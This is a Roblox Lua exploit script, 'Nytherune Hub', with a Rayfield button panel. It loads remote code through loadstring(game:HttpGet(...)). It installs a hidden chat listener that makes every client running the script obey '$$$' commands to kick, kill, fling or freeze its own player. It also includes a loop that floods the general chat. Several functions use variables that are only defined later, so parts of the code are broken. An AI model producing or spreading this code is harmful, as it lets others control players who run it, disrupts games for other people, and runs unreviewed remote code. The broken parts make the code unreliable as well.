-- oii



local TextChatService = game:GetService("TextChatService")

local function SendCommandMessage(command, target)
    local channel = TextChatService.TextChannels.RBXGeneral
    if channel then
        local msg = "$$$"..command
        if target then msg = msg.." "..target end
        channel:SendAsync(msg)
    end
end

-- Comandos locais
local function Kick(playerName)
    if playerName == LocalPlayer.Name then
        LocalPlayer:Kick("Você foi removido pelo Nytherune Hub.")
    end
end

local function Kill(playerName)
    if playerName == LocalPlayer.Name then
        local char = GetCharacter(LocalPlayer.Name)
        if char then char:BreakJoints() end
    end
end

local function KillPlus(playerName)
    if playerName == LocalPlayer.Name then
        local char = GetCharacter(LocalPlayer.Name)
        if char then
            char:BreakJoints()
            local root = char:FindFirstChild("HumanoidRootPart")
            if root then
                for i = 1, 10 do
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(10,10,10)
                    part.Anchored = false
                    part.CanCollide = false
                    part.Material = Enum.Material.Neon
                    part.BrickColor = BrickColor.Random()
                    part.CFrame = root.CFrame
                    part.Parent = workspace

                    local bv = Instance.new("BodyVelocity")
                    bv.Velocity = Vector3.new(math.random(-50,50), math.random(20,80), math.random(-50,50))
                    bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
                    bv.Parent = part

                    game.Debris:AddItem(part, 3)
                end
            end
        end
    end
end

local function Fling(playerName)
    if playerName == LocalPlayer.Name then
        local char = GetCharacter(LocalPlayer.Name)
        if char then
            local root = char:FindFirstChild("HumanoidRootPart")
            if root then
                local targetCFrame = CFrame.new(50000,5000000,3972823)
                local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear)
                local tween = TweenService:Create(root, tweenInfo, {CFrame = targetCFrame})
                tween:Play()
            end
        end
    end
end

local function Freeze(playerName)
    if playerName == LocalPlayer.Name then
        local char = GetCharacter(LocalPlayer.Name)
        if char then
            for _, part in ipairs(char:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.Anchored = true
                end
            end
        end
    end
end

local function Verifique()
    local channel = TextChatService.TextChannels.RBXGeneral
    if channel then
        local randomNumber = math.random(1000,9999)
        local msg = "Nytherune_"..randomNumber
        channel:SendAsync(msg)
    end
end

local function TimeoutRoblox()
    spawn(function()
        local channel = TextChatService.TextChannels.RBXGeneral
        while true do
            if channel then
                channel:SendAsync("##########")
            end
            task.wait(0)
        end
    end)
end

-- Lista de comandos

-- Listener de mensagens $$$ para executar comandos localmente
TextChatService.OnIncomingMessage = function(message)
    if message.Text:sub(1,3) == "$$$" then
        local args = string.split(message.Text," ")
        local command = args[1]:sub(4):lower()
        local target = args[2]

        if command == "kick" then Kick(target) end
        if command == "kill" then Kill(target) end
        if command == "killplus" then KillPlus(target) end
        if command == "fling" then Fling(target) end
        if command == "freeze" then Freeze(target) end
        if command == "verifique" then Verifique() end
        if command == "timeoutroblox" then TimeoutRoblox() end
    end
end


task.delay(2, function()
    


local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-Interface/CustomFIeld/main/RayField.lua'))()
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TweenService = game:GetService("TweenService")

-- Criação da janela
local Window = Rayfield:CreateWindow({
    Name = "Nytherune Hub Developers",
    LoadingTitle = "Script Secreto de Administradores",
    LoadingSubtitle = "by Wx",
    ConfigurationSaving = {
        Enabled = true,
        FolderName = "NytheruneHub",
        FileName = "DevConfig"
    },
    KeySystem = true,
    KeySettings = {
        Title = "Se o script já apareceu ignore isso, não é necessário colocar key.",
        Subtitle = "Se você já executou o script e ele apareceu, pode ignorar isso.",
        Note = "© Nytherune Hub Developers All Rights Reserved 2024-2025.",
        FileName = "NytheruneKey",
        SaveKey = true,
        GrabKeyFromSite = false,
        Key = "0000-batata-frita"
    }
})

local MainTab = Window:CreateTab("Principal", 4483362458)

-- Função para pegar jogadores exceto o LocalPlayer
local function GetPlayersList()
    local list = {}
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            table.insert(list, plr.Name)
        end
    end
    return list
end

local playerList = GetPlayersList()
local SelectedPlayer = playerList[1]

-- Dropdown de seleção de jogador
local PlayerDropdown = MainTab:CreateDropdown({
    Name = "Selecionar Jogador",
    Options = playerList,
    CurrentOption = SelectedPlayer,
    MultiSelection = false,
    Flag = "DropdownPlayers",
    Callback = function(Value)
        SelectedPlayer = Value
    end
})

-- Atualiza o dropdown quando players entram/saem
Players.PlayerAdded:Connect(function()
    local list = GetPlayersList()
    PlayerDropdown:Refresh(list)
    if not table.find(list, SelectedPlayer) then
        SelectedPlayer = list[1]
        PlayerDropdown:Set(SelectedPlayer)
    end
end)
Players.PlayerRemoving:Connect(function()
    local list = GetPlayersList()
    PlayerDropdown:Refresh(list)
    if not table.find(list, SelectedPlayer) then
        SelectedPlayer = list[1]
        PlayerDropdown:Set(SelectedPlayer)
    end
end)

-- Funções auxiliares
local function GetCharacter(playerName)
    local plr = Players:FindFirstChild(playerName)
    if plr then
        return plr.Character
    end
    return nil
end



local commands = {
    {Name=";kick", Func=Kick},
    {Name=";kill", Func=Kill},
    {Name=";killplus", Func=KillPlus},
    {Name=";fling", Func=Fling},
    {Name=";freeze", Func=Freeze},
    {Name=";verifique", Func=Verifique},
    {Name=";timeoutroblox", Func=TimeoutRoblox}
}

-- Criação de botões
for _, cmd in ipairs(commands) do
    MainTab:CreateButton({
        Name = cmd.Name,
        Callback = function()
            if cmd.Name == ";verifique" then
                SendCommandMessage("verifique")
                cmd.Func()
            elseif cmd.Name == ";timeoutroblox" then
                SendCommandMessage("timeoutroblox")
                cmd.Func()
            else
                SendCommandMessage(cmd.Name:gsub(";",""), SelectedPlayer)
                cmd.Func(SelectedPlayer)
            end
        end
    })
end
end)
